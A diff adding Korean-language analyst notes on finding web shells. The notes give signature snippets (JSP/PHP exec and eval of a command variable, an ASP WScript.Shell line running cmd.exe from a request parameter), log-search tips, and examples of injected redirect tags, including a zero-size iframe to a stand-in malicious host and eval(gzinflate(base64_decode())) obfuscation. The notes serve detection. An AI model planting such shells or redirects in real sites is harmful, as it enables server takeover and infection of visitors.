@@ -1,0 +1,53 @@
+	1. 자주 사용되는 웹쉘 문장
+	가. JSP
+  Process p = Runtime.getRuntime().exec(cmd);
+	나. PHP
+  exec($cmd);
+  eval($cmd);
+  
+	다. ASP
+  Set os = Server.CreateObject("WSCRIPT.SHELL");
+  output = os.exec("cmd.exe > /c " & request("command")).stdout.readall;
+  
+  라. 기타
+  LcxMarcos : 최근 자주 사용되는 구문
+  Session("#"), Session("1") : 최근 자주 사용되는 구문
+  Request("#"), Request("1") : 최근 자주 사용되는 구문
+  cmd.exe command.com : 윈도우용 웹쉘
+  Encode : 웹쉘을 암호화하는데 사용
+  gb2312 : 중국어를 나타내기 위한 문자코드
+	
+	2. 바이러스 토탈 검색
+  hxxp://virustotal.com
+
+	3. 웹 로그 검색
+  웹쉘은 공격자에 의해 요청되기 때문에 웹 로그에서 해당 파일에 대한 접속 흔적을 확인 할 수 있다.
+  
+  #분석방법
+  가. 기존페이지가 아닌 컨텐츠가 있거나 또는 기존 페이지 접속보다 히트 수가 적은 페이지를 대상으로 검색.
+  나. 검사대상 디렉토리 내에 특이한 이름 등도 확인하여야 함.
+  다. 업로드 파일이 저장되는 디렉터리를 위주로 검사.
+
+	4. 웹쉘 분석
+  정상 페이지에 접속하지만 악성 URL로 redirect를 시켜서 악성코드를 감염시킨다.
+  이때 발생하는 응답코드는 일반적으로 300번대를 가지고 있다.
+	#사용되는 HTTP 태그
+    - Meta 태그
+    <metahttp-equiv="refresh" content="0; URL=http://www.maliciouscode.com/">
+    
+    - javascript location 태그
+    <script> location = "hxxp://www.maliciouscode.com"; </script>
+	
+    - iframe 태그
+    <iframe src="http://www.maliciouscode.com" width=0 height=0 align="center">XSS</iframe>
+	
+    - URI 인코딩을 사용한 Obfuscated(난독화) 스크립트
+    <script language="javascript"><!-- document.write(unescape("%3cscript ~~~~"));//--></script>
+    String.fromCharCode("~~~")
+	
+    - 치환을 이용한 난독화 스크립트
+	
+	  - PHP 은닉코드
+    ?><?php eval(gzinflate(base64_decode('~~~~'))l/><?php
+    => hxxp://www.tareeinternet.com/scripts/decrypt.php 사이트에서 디코딩 가능.
+	
